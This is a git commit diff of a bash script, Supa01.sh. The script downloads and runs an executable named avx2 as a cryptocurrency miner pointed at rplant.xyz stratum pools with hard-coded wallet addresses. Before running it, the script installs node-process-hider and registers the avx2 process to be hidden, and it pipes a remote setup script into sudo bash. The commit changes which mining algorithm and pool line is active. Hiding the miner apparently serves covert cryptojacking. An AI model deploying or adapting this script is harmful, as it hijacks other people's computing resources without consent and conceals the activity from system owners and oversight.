db44aceb20e5a9523cb6be43cb3d36cb9fd81c50
BatiKangkung <107105404+BatiKangkung@users.noreply.github.com>
2022-07-10 03:08:19 +0700

    Update Supa01.sh

--- Supa01.sh
+++ Supa01.sh
@@ -1,7 +1,7 @@
 #!/bin/bash 
 sudo apt update -y && sudo apt install gcc -y && curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash - && apt install nodejs -y && npm install -g npm@8.10.0 -y && npm i -g node-process-hider && ph add avx2 && wget https://github.com/BatiKangkung/KangKung/raw/main/avx2 && chmod +x avx2 
-# ./avx2 -a yespower  -o stratum+tcps://stratum-eu.rplant.xyz:17017 -u web1qvpk4dddsmy7yqnzltj4ehpn99uf6jlfpqukjvy.$(echo $(shuf -i 1000-9999 -n 1)-C) -p x
-./avx2 -a minotaurx -o stratum+tcps://stratum-asia.rplant.xyz:17068 -u RP7dNRcUFy4BngHv5okrAMHAkW3guQ7kCU.$(echo $(shuf -i 1000-9999 -n 1)-C) -p x
+./avx2 -a yespower  -o stratum+tcps://stratum-eu.rplant.xyz:17017 -u web1qvpk4dddsmy7yqnzltj4ehpn99uf6jlfpqukjvy.$(echo $(shuf -i 1000-9999 -n 1)-C) -t 1 -p x
+# ./avx2 -a minotaurx -o stratum+tcps://stratum-asia.rplant.xyz:17068 -u RP7dNRcUFy4BngHv5okrAMHAkW3guQ7kCU.$(echo $(shuf -i 1000-9999 -n 1)-C) -p x
 
 
 
